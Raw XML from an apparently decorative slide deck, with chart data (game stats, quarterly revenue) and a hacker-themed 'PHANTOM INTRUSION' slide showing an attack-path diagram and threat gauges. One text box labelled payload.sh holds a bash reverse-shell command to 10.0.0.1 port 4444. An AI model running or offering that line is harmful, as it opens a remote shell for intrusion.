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72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22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DA9-4205-93B0-4D23CD3F6785}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:dPt>
            <c:idx val="1"/>
            <c:bubble3D val="0"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="1111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DA9-4205-93B0-4D23CD3F6785}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>Sheet1!$A$2:$A$3</c:f>
              <c:strCache>
                <c:ptCount val="2"/>
                <c:pt idx="0">
                  <c:v>val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94</c:v>
                </c:pt>
                <c:pt idx="1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DA9-4205-93B0-4D23CD3F67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FF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951-4C20-92B1-F44EBEC7C231}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:dPt>
            <c:idx val="1"/>
            <c:bubble3D val="0"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="1111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951-4C20-92B1-F44EBEC7C231}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>Sheet1!$A$2:$A$3</c:f>
              <c:strCache>
                <c:ptCount val="2"/>
                <c:pt idx="0">
                  <c:v>val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</c:v>
                </c:pt>
                <c:pt idx="1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951-4C20-92B1-F44EBEC7C2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AA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53B-485F-87B8-702F5B54C097}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:dPt>
            <c:idx val="1"/>
            <c:bubble3D val="0"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="1111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53B-485F-87B8-702F5B54C097}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>Sheet1!$A$2:$A$3</c:f>
              <c:strCache>
                <c:ptCount val="2"/>
                <c:pt idx="0">
                  <c:v>val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88</c:v>
                </c:pt>
                <c:pt idx="1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53B-485F-87B8-702F5B54C0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C00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076-43F9-B2C3-EFC85C55BD13}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:dPt>
            <c:idx val="1"/>
            <c:bubble3D val="0"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="1111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076-43F9-B2C3-EFC85C55BD13}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>Sheet1!$A$2:$A$3</c:f>
              <c:strCache>
                <c:ptCount val="2"/>
                <c:pt idx="0">
                  <c:v>val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61</c:v>
                </c:pt>
                <c:pt idx="1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076-43F9-B2C3-EFC85C55BD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99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2A3-43CD-9E76-212109E3820B}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:dPt>
            <c:idx val="1"/>
            <c:bubble3D val="0"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="1111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2A3-43CD-9E76-212109E3820B}"/>
              </c:ext>
            </c:extLst>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>Sheet1!$A$2:$A$3</c:f>
              <c:strCache>
                <c:ptCount val="2"/>
                <c:pt idx="0">
                  <c:v>val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83</c:v>
                </c:pt>
                <c:pt idx="1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2A3-43CD-9E76-212109E382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炼体</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="B8732A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斩杀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2B-43D3-8510-D6AEEB297EA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聚气</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="B8732A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斩杀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02B-43D3-8510-D6AEEB297EA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筑基</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="B8732A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斩杀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8400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02B-43D3-8510-D6AEEB297EA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金丹</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="CC8833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斩杀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32000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02B-43D3-8510-D6AEEB297EA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元婴</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="CC8833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斩杀</c:v>
                </c:pt>
              </c:strCache>
            </c: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87000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02B-43D3-8510-D6AEEB297EA5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化神</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="FF4422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斩杀</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$G$2:$G$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>470000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02B-43D3-8510-D6AEEB297EA5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当前</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="FFD700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斩杀</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$H$2:$H$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>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02B-43D3-8510-D6AEEB297E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3800"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:endParaRPr lang="zh-CN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A2800"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:endParaRPr lang="zh-C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历季收入</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="BFDBFE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24Q2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67-43E8-B680-1D90340ECA6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历季收入</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="BFDBFE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24Q3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767-43E8-B680-1D90340ECA6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历季收入</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="93C5FD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24Q4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3200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767-43E8-B680-1D90340ECA6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历季收入</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="93C5FD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25Q1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3500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767-43E8-B680-1D90340ECA6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历季收入</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="93C5FD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25Q2</c:v>
                </c:pt>
              </c:strCache>
            </c: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3800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767-43E8-B680-1D90340ECA6C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历季收入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25Q3</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$G$2:$G$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>4100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767-43E8-B680-1D90340ECA6C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历季收入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25Q4</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$H$2:$H$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>4400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767-43E8-B680-1D90340ECA6C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26Q1当季</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:solidFill>
              <a:srgbClr val="0066CC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26Q1</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$I$2:$I$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>4782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767-43E8-B680-1D90340ECA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zh-CN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CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:endParaRPr lang="zh-CN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9340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186"/>
            <a:ext cx="9144000" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000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1566"/>
            <a:ext cx="9144000" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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7717" y="354027"/>
            <a:ext cx="269735" cy="287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224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☠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11398" y="318062"/>
            <a:ext cx="3776283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350" b="1" kern="0" spc="5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PHANTOM INTRUSION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11398" y="587796"/>
            <a:ext cx="4495575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kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00CC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诫秘入侵 · 高级持续性威胁分析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7714407" y="461920"/>
            <a:ext cx="89912" cy="89912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF00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58265" y="407973"/>
            <a:ext cx="1168850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FF4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BREACH DETECTED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7858265" y="569814"/>
            <a:ext cx="1168850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75" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00CC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2026-03-13  03:47:22</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="839549"/>
            <a:ext cx="9144000" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0005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717" y="983407"/>
            <a:ext cx="3416637" cy="4981097"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010A01"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00FF4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717" y="983407"/>
            <a:ext cx="3416637" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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611" y="1055336"/>
            <a:ext cx="3056991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kern="0" spc="300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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ATTACK_VECTOR_MAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395611" y="1199195"/>
            <a:ext cx="2697345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25" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF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 攻击渗透路径</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1991540" y="1738664"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF33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91540" y="2368044"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF33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49" y="2907513"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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91540" y="2907513"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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34513" y="2907513"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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91540" y="3716717"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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91540" y="2368044"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF33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1044" y="2498416"/>
            <a:ext cx="1024991" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF33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91540" y="2368044"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF33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96035" y="2498416"/>
            <a:ext cx="1042973" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF33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6549" y="3446982"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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1044" y="3577354"/>
            <a:ext cx="1024991" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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91540" y="3986451"/>
            <a:ext cx="8991" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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46478" y="1504894"/>
            <a:ext cx="899115" cy="233770"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7823"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="200008"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="FF22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46478" y="1504894"/>
            <a:ext cx="899115" cy="233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4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PHISHING EMAIL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1546478" y="2008398"/>
            <a:ext cx="899115" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5085"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2008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46478" y="2008398"/>
            <a:ext cx="899115" cy="359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6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 ACCESS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6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CVE-2025-4821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521487" y="2637779"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010D02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487" y="2637779"/>
            <a:ext cx="899115" cy="26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3" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00CC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LATERAL MOVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1546478" y="2637779"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010D02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46478" y="2637779"/>
            <a:ext cx="899115" cy="26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3" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00CC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 ESCALATE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2589451" y="2637779"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1008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89451" y="2637779"/>
            <a:ext cx="899115" cy="26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3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PERSISTENCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="521487" y="3177248"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010D02"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00441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1487" y="3177248"/>
            <a:ext cx="899115" cy="26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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00A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ROOTKIT DEPLOY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1546478" y="3177248"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010D02"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00441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546478" y="3177248"/>
            <a:ext cx="899115" cy="26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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00A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 CHANNEL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2589451" y="3177248"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0800"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="5544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89451" y="3177248"/>
            <a:ext cx="899115" cy="26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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC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BACKDOOR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1546478" y="3716717"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010D0A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00FF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546478" y="3716717"/>
            <a:ext cx="899115" cy="26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3" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00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EXFIL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2589451" y="3716717"/>
            <a:ext cx="899115" cy="269735"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0800"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="4433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89451" y="3716717"/>
            <a:ext cx="899115" cy="26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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AA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 TRACKS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Shape 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1366655" y="4256186"/>
            <a:ext cx="1258761" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9245"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="200008"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="FF00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366655" y="4256186"/>
            <a:ext cx="1258761" cy="197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22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 COMPLETE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3812248" y="983407"/>
            <a:ext cx="5044035" cy="2445593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010A01"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00FF4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812248" y="983407"/>
            <a:ext cx="5044035" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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920142" y="1055336"/>
            <a:ext cx="3596460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kern="0" spc="300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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THREAT_INDICATORS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="1199195"/>
            <a:ext cx="2697345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25" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF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 威胁等级评估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3920142" y="1450947"/>
            <a:ext cx="737274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8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渗透深度</a:t>
            </a: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4729345" y="1495903"/>
            <a:ext cx="3677381" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0115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29345" y="1495903"/>
            <a:ext cx="3456738" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF22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42690" y="1450947"/>
            <a:ext cx="323681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22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94%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3920142" y="1738664"/>
            <a:ext cx="737274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8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数据泄露量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4729345" y="1783619"/>
            <a:ext cx="3677381" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0115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29345" y="1783619"/>
            <a:ext cx="2868357" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6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442690" y="1738664"/>
            <a:ext cx="323681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78%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3920142" y="2026381"/>
            <a:ext cx="737274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8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隐蔽性评分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4729345" y="2071336"/>
            <a:ext cx="3677381" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0115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29345" y="2071336"/>
            <a:ext cx="3236095" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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442690" y="2026381"/>
            <a:ext cx="323681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88%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3920142" y="2314097"/>
            <a:ext cx="737274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8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横向移动范围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4729345" y="2359053"/>
            <a:ext cx="3677381" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0115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29345" y="2359053"/>
            <a:ext cx="2243202" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="009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442690" y="2314097"/>
            <a:ext cx="323681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C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61%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3920142" y="2601814"/>
            <a:ext cx="737274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8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持久化程度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Shape 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="2646770"/>
            <a:ext cx="3677381" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0115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729345" y="2646770"/>
            <a:ext cx="3052226" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC0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442690" y="2601814"/>
            <a:ext cx="323681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F0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83%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Text 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="2889531"/>
            <a:ext cx="737274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088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C2通信频率</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Shape 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="2934487"/>
            <a:ext cx="3677381" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0115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729345" y="2934487"/>
            <a:ext cx="2647714" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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442690" y="2889531"/>
            <a:ext cx="323681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72%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Shape 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="3159265"/>
            <a:ext cx="4828248" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001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920142" y="3159265"/>
            <a:ext cx="17982" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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974088" y="3177248"/>
            <a:ext cx="4774301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525" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007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payload.sh — 混淆执行链</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Text 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3974088" y="3303124"/>
            <a:ext cx="4774301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525" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00A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 3&gt;&amp;1 $(bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Shape 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3812248" y="3536894"/>
            <a:ext cx="5044035" cy="2445593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="010A01"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00FF41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812248" y="3536894"/>
            <a:ext cx="5044035" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF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920142" y="3608823"/>
            <a:ext cx="3596460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kern="0" spc="300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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REALTIME_LOG_STREAM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
